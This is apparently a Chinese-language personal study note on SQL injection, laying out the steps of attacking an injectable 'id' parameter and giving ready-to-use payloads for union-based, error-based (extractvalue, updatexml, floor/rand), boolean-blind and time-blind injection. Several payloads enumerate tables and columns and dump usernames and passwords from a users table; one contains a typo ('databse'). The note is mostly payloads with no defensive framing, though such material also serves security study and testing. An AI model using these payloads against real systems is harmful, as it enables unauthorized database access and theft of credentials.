---
title: sql注入
date: 2021-12-28 14:15:15
tags: 
- sql
- 注入
---

## sql 注入

### 一般过程

1. 找到网站注入点
2. 判断注入点是字符型还是数字型注入（使用减法，使用and 1=1）
3. 判断闭合方式（fuzz，仅限于字符型注入）
4. 判断前一条sql查询列数（group by 、 order by容易waf检测）
5. 查询回显位（仅限union注入）
    * `?id=-1 union select 1,2,3`
6. 查询当前数据库库名
7. 查询当前数据库所有表名
    * `?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()`
8. 查询当前数据所有列名 users
    * `?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name = 'users'`
9. 查询当前数据表所有列项 id,username,password
    * `?id=-1 union select 1,2,group_concat(id,'~',username) from users`

### 报错注入
原理：优先执行括号内的内容,报错注入最多一次只能显示32个字符
1. extractvalue报错注入

    * 数据库读取XML文件，extractvalue(书名，路径)，路径格式必须是`/`，否则报错
    * concat(0x7e,(select database()))组合参数

    * `?id=-1' and 1=extractvalue(1,concat(0x7e,(select database()))) --+`
    * substring('test',x,y)，从第x个字符开始，显示y个字符 
    * 解决只能返回32个字符串问题
    `?id=-1' and 1=extractvalue(1,concat(0x7e,(select substring(group_concat(username,'~',password),25,30)))) --+ /*从第25个字符往后再显示30个字符*/` 

2. updatexml报错注入
    * updatexml()修改文档，三个参数，第二个参数为路径
    * `id=1' and 1=updatexml(1,concat(0x7e,(select databse())),3) --+`
    * `?id=1 union select 1,2,updatexml(1,concat(0x7e,(select database())),3) --+`


`SELECT concat_ws('-',2.3);`
`SELECT concat_ws('-',database(),floor(rand()*2));`
`select count(*),concat_ws('-',(select database()),floor(rand(0)*2)) as cc from information_schema.tables group by cc;`




3. 布尔盲注
    *   页面不会报错，页面有两种状态，一种真值，一种假值
    `?id=1' and ascii(substring((select database()),2,1))=101 --+`


4. 时间盲注

    `select if(1>2,2,sleep(2));`

